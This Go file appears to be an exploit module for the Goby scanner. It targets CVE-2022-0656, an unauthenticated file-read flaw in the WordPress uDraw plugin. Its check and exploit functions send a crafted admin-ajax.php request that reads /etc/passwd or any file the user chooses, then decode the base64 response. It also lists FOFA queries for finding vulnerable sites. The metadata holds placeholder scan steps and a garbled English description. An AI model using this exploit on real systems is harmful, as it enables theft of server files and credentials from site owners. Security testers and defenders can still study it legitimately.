package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Wordpress uDraw plugin url file read vulnerability (CVE-2022-0656)",
    "Description": "<p>WordPress and WordPress plugin are products of the WordPress Foundation. WordPress is a blog platform developed using PHP language. The platform supports personal blog websites on PHP and MySQL servers. WordPress plugin is an application plug-in.</p><p>WordPress plugin Web To Print Shop: there is a security vulnerability before uDraw 3.3.3. The vulnerability originates from that the plugin will not_ convert_ url_ to_ Verify the url parameter in the base64 AJAX operation (available to both unauthenticated and authenticated users), and then click File_ get_ The contents function uses it and returns the content base64 encoded in the response.</p>",
    "Product": "wordpress-uDraw",
    "Homepage": "https://wordpress.org/plugins/udraw/",
    "DisclosureDate": "2022-12-26",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "body=\"/wp-content/plugins\" && body=\"/udraw\"",
    "GobyQuery": "body=\"/wp-content/plugins\" && body=\"/udraw\"",
    "Level": "3",
    "Impact": "<p>WordPress plugin Web To Print Shop: there is a security vulnerability before uDraw 3.3.3. The vulnerability originates from that the plugin will not_ convert_ url_ to_ Verify the url parameter in the base64 AJAX operation (available to both unauthenticated and authenticated users), and then click File_ get_ The contents function uses it and returns the content base64 encoded in the response.</p>",
    "Recommendation": "<p>The manufacturer has no solution for the time being. Please follow the manufacturer's update:<a href=\"https://wordpress.org/plugins/udraw/\">https://wordpress.org/plugins/udraw/</a></p>",
    "References": [
        "https://wordpress.org/plugins/udraw/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2022-0656"
    ],
    "CNNVD": [
        "CNNVD-202204-4361"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Wordpress uDraw 插件 url 参数文件读取漏洞（CVE-2022-0656）",
            "Product": "wordpress-uDraw",
            "Description": "<p>WordPress和WordPress plugin都是WordPress基金会的产品。WordPress是一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress plugin是一个应用插件。</p><p>WordPress plugin Web To Print Shop : uDraw 3.3.3 之前存在安全漏洞，该漏洞源于插件不会在其 udraw_convert_url_to_base64 AJAX 操作中验证 url 参数（对未经身份验证和经过身份验证的用户都可用），然后在 file_get_contents 函数中使用它并返回其在响应中编码的内容 base64。</p>",
            "Recommendation": "<p>厂商暂时没有解决方案，请关注厂商更新：<a href=\"https://wordpress.org/plugins/udraw/\" target=\"_blank\">https://wordpress.org/plugins/udraw/</a></p>",
            "Impact": "<p>WordPress plugin Web To Print Shop : uDraw 3.3.3 之前存在安全漏洞，该漏洞源于插件不会在其 udraw_convert_url_to_base64 AJAX 操作中验证 url 参数（对未经身份验证和经过身份验证的用户都可用），然后在 file_get_contents 函数中使用它并返回其在响应中编码的内容 base64。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Wordpress uDraw plugin url file read vulnerability (CVE-2022-0656)",
            "Product": "wordpress-uDraw",
            "Description": "<p>WordPress and WordPress plugin are products of the WordPress Foundation. WordPress is a blog platform developed using PHP language. The platform supports personal blog websites on PHP and MySQL servers. WordPress plugin is an application plug-in.</p><p>WordPress plugin Web To Print Shop: there is a security vulnerability before uDraw 3.3.3. The vulnerability originates from that the plugin will not_ convert_ url_ to_ Verify the url parameter in the base64 AJAX operation (available to both unauthenticated and authenticated users), and then click File_ get_ The contents function uses it and returns the content base64 encoded in the response.</p>",
            "Recommendation": "<p>The manufacturer has no solution for the time being. Please follow the manufacturer's update:<a href=\"https://wordpress.org/plugins/udraw/\" target=\"_blank\">https://wordpress.org/plugins/udraw/</a><br></p>",
            "Impact": "<p>WordPress plugin Web To Print Shop: there is a security vulnerability before uDraw 3.3.3. The vulnerability originates from that the plugin will not_ convert_ url_ to_ Verify the url parameter in the base64 AJAX operation (available to both unauthenticated and authenticated users), and then click File_ get_ The contents function uses it and returns the content base64 encoded in the response.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10789"
}`


	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			uri_1 := "/wp-admin/admin-ajax.php"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg_1.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg_1.Data = "action=udraw_convert_url_to_base64&url=/etc/passwd"
			if resp, err := httpclient.DoHttpRequest(hostinfo, cfg_1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "cm9vd") && strings.Contains(resp.Utf8Html, "data:image") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			file_path := ss.Params["filePath"].(string)
			uri_1 := "/wp-admin/admin-ajax.php"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg_1.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg_1.Data = "action=udraw_convert_url_to_base64&url="+file_path
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "data:image") {
					r, _ := regexp.Compile(`base64,(.*?)"`)
					base64_response := r.FindStringSubmatch(resp.Utf8Html)
					if len(base64_response) < 2 {
						expResult.Success = false
					} else {
						decode_base64, err := base64.StdEncoding.DecodeString(base64_response[1])
						if err != nil {
							expResult.Success = false
						} else {
							//decode_str := ""
							//for i := 0; i <= len(decode_base64); i++ {
							//	decode_str = decode_str + string(decode_base64[0])
							//}
							expResult.Success = true

							expResult.Output = string(decode_base64)
						}

					}

				}
			}
			return expResult
		},
	))
}

